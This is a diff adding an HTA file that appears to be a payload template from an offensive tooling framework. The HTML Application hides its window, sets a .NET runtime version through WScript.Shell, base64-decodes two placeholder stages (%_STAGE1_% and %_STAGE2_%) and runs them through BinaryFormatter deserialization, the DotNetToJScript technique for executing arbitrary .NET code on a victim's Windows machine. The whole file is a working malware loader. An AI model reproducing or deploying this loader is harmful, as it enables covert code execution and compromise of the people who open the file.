@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <HTA:APPLICATION icon="#" WINDOWSTATE="normal" SHOWINTASKBAR="no" SYSMENU="NO" CAPTION="no" BORDER="none" SCROLL="no"/>
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="x-ua-compatible" content="ie=9">
+        <script language="javascript">
+            window.resizeTo(-1,-1);
+            function ConvertToStream(b, l) {
+				var enc = new ActiveXObject("System.Text.ASCIIEncoding");
+				var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
+				var ms = new ActiveXObject("System.IO.MemoryStream");
+				
+                var ba = enc.GetBytes_4(b);
+				ba = transform.TransformFinalBlock(ba, 0, enc.GetByteCount_2(b));
+				ms.Write(ba, 0, l);
+				ms.Position = 0;
+				return ms;
+			}
+
+			var s1 = "%_STAGE1_%";
+			var s2 = "%_STAGE2_%";
+
+			try {
+				var shell = new ActiveXObject('WScript.Shell');
+				shell.Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
+				var stream1 = ConvertToStream(s1, %_STAGE1Len_%);
+				var format1 = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
+				format1.Deserialize_2(stream1);
+			} catch (e) {
+				try {		
+					var stream2 = ConvertToStream(s2, %_STAGE2Len_%);
+					var format2 = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
+					format2.Deserialize_2(stream2);
+				} catch (e2) {}
+			}
+        </script>
+    </head>
+    <body>
+    </body>
+</html>
